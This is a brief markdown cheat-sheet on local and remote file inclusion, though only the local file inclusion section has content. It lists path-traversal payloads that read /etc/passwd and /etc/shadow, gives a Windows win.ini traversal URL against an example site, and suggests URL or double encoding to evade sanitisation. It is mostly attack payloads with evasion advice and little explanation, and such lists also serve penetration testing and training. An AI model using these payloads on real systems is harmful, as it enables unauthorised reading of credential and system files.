# Local and Remote File Inclusion

## Local File Inclusion
Common payloads:
- `../../../../../etc/passwd`: Linux user database
- `../../../../../etc/shadow`: Linux password information
- `https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini`: Equivalent attack against IIS

Note: Can also try URL encoding or double encoding to prevent basic sanitisation.
